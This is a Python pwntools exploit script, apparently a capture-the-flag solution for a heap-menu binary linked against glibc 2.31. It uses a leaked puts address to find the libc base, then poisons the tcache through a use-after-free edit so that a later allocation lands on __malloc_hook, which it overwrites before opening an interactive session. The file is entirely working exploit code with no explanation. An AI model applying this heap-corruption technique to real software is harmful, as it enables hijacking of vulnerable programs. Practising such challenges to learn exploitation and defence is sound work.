#!/usr/bin/env python3

from pwn import *

elf = ELF("./task_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.terminal = 'kitty'
context.log_level = 'debug'
context.binary = elf

def main():
    # p = process()
    p = gdb.debug('./task')

    def malloc(size):
        p.sendlineafter('> ', b'1')
        p.sendlineafter('Size: ', str(size).encode())
        p.sendlineafter('Data: ', '')

    def free(index):
        p.sendlineafter('> ', b'2')
        p.sendlineafter('Index: ', str(index).encode())

    def edit(index, data):
        p.sendlineafter('> ', b'3')
        p.sendlineafter('Index: ', str(index).encode())
        p.sendlineafter('Data: ', data)


    p.recvuntil('puts @ ')
    puts = int(p.recvline().decode().strip(), 16)
    libc.address = puts - libc.sym.puts
    log.info("puts, %#x", puts)
    log.info("libc.address, %#x", libc.address)
    log.info("__malloc_hook, %#x", libc.sym.__malloc_hook)

    malloc(8)
    malloc(8)
    free(1)
    free(0)
    edit(0, pack(libc.sym.__malloc_hook))
    malloc(8)
    malloc(8)
    edit(3, pack(elf.sym.main))
    malloc(8)

    p.interactive()


if __name__ == "__main__":
    main()
